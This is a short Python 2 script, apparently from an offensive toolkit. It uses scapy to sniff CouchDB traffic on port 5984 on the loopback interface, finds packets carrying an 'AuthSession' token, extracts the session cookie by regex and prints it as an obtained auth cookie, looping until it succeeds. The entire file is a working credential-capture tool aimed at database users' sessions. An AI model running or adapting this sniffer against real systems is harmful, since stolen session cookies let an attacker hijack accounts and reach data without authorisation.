from scapy.all import *
import re
import hashlib
from termcolor import colored

md5 = hashlib.md5

packets=""



def get_packets(port, iface, count):
	packets = sniff(filter="port "+str(port)+"", count=count, iface=str(iface))
	return packets

def parse_packets(port, iface, count):
		
	cookie=""
	packet=""
	packets = get_packets(port, iface, count)
	for i in xrange(len(packets)):
		if "AuthSession" in re.findall(r'[A-Za-z0-9]{3,}', str(packets[i])):
			packet=packets[i]
			break
	if(len(packet)!=0):
		try:
			cookie = re.findall(r'[A-Za-z0-9]{15,}', str(packet))[0]
		except IndexError:
			return 0
	if len(cookie)==0:
		return 0
	else: 
		print colored("[-] Obtained Auth Cookie:"+cookie,'green')
		return 1

		

def sniff_couch():
	print colored("[-] Getting Packets",'blue')
	print colored("[-] Sniffing packages...",'blue')
	print colored("[-] Parse packages...",'blue')
	val=parse_packets("5984", "lo", 20)
	while True:
		if val==1:
			break
		else:
			val=parse_packets("5984", "lo", 3)
			pass

